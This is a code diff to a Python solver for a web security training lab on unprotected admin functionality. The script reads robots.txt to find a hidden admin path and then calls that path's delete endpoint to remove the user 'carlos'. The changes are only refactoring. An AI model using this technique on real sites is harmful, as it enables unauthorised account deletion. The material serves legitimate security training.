@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-"""This lab has an unprotected admin panel"""
+"""Unprotected admin functionality"""
 
 import os
 
 import requests
+
 
 class Lab:
     """Wrapper"""
@@ -13,10 +14,9 @@ class Lab:
         self.url = f"https://{lab_id}.web-security-academy.net"
 
     # pylint: disable=no-self-use # we override it later
-    def get(self, url: str, params: dict = None) -> requests.models.Response:
+    def get(self, url: str, params: dict | None = None) -> requests.models.Response:
         """Get URL"""
-        response = requests.get(url, params=params)
-        return response
+        return requests.get(url, params=params)
 
     def robots(self) -> requests.models.Response:
         """Get robots.txt"""
@@ -25,6 +25,7 @@ class Lab:
     def disallowed(self) -> str:
         """Get the only disallowed path"""
         robots = self.robots()
+        robots.raise_for_status()
         disallowed = set()
         for line in robots.text.splitlines():
             if "Disallow: " in line:
@@ -38,7 +39,9 @@ class Lab:
         url = f"{self.url}{admin_panel}/delete"
         payload = {"username": username}
         response = self.get(url=url, params=payload)
+        response.raise_for_status()
         return response
+
 
 def main() -> None:
     """Entry point"""
@@ -46,6 +49,7 @@ def main() -> None:
     admin_panel = site.disallowed()
     print(admin_panel)
     site.delete_user(admin_panel=admin_panel, username="carlos")
+
 
 if __name__ == "__main__":
     main()
